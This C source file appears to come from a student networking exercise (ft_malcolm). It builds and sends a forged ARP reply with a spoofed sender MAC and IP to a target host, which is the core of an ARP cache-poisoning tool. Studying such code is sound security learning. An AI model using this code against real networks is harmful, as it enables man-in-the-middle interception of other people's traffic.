/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   packet.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: macarval <macarval@student.42sp.org.br>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/24 12:03:42 by macarval          #+#    #+#             */
/*   Updated: 2025/09/27 15:32:20 by macarval         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

void	reply_packet(void)
{
	u_int8_t			frame[ETH_LEN + sizeof(t_arp)];
	struct sockaddr_ll	device;

	setup_device(&device);
	setup_packet();

	ft_memcpy(frame, &g_data.eth, ETH_LEN);
	ft_memcpy(frame + ETH_LEN, &g_data.arp, sizeof(t_arp));

	printf("Now sending an ARP reply to the target address ");
	printf("with spoofed source, please wait...");

	if (sendto(g_data.info.sock_fd, &frame, sizeof(frame), 0,
			(struct sockaddr *)&device, sizeof(device)) < 0)
		fatal_error("Failed to send ARP packet!");

	printf("Sent an ARP reply packet, you may now check the ");
	printf("arp table on the target.");

	// validar os prints
	print_log("Packet sent", "Sent ARP frame", sizeof(frame), (char *)frame);

	if (g_data.info.has_flag)
		printf("[VERBOSE] ARP reply sent to %s\n", g_data.info.if_name);
}

void	setup_device(struct sockaddr_ll *device)
{
	ft_memset(device, 0, sizeof(struct sockaddr_ll));

	device->sll_family = AF_PACKET;
	device->sll_protocol = htons(ETH_P_ARP);
	device->sll_ifindex = get_index_if();
	device->sll_halen = ETH_ALEN;

	ft_memcpy(device->sll_addr, g_data.info.target_mac,
		ETH_ALEN * sizeof(uint8_t));
}

void	setup_packet(void)
{
	g_data.arp.htype = htons(ARPHRD_ETHER);
	g_data.arp.ptype = htons(ETHERTYPE_IP);
	g_data.arp.hlen = ETH_ALEN;
	g_data.arp.plen = INET4_LEN;
	g_data.arp.opcode = htons(ARPOP_REPLY);

	ft_memcpy(g_data.arp.sender_mac, g_data.info.source_mac, ETH_ALEN);
	ft_memcpy(g_data.arp.sender_ip, g_data.info.source_ip, INET4_LEN);
	ft_memcpy(g_data.arp.target_mac, g_data.info.target_mac, ETH_ALEN);
	ft_memcpy(g_data.arp.target_ip, g_data.info.target_ip, INET4_LEN);

	g_data.eth.ethertype = htons(ETHERTYPE_ARP);
	ft_memcpy(g_data.eth.dst_mac, g_data.info.target_mac, ETH_ALEN);
	ft_memcpy(g_data.eth.src_mac, g_data.info.source_mac, ETH_ALEN);
}
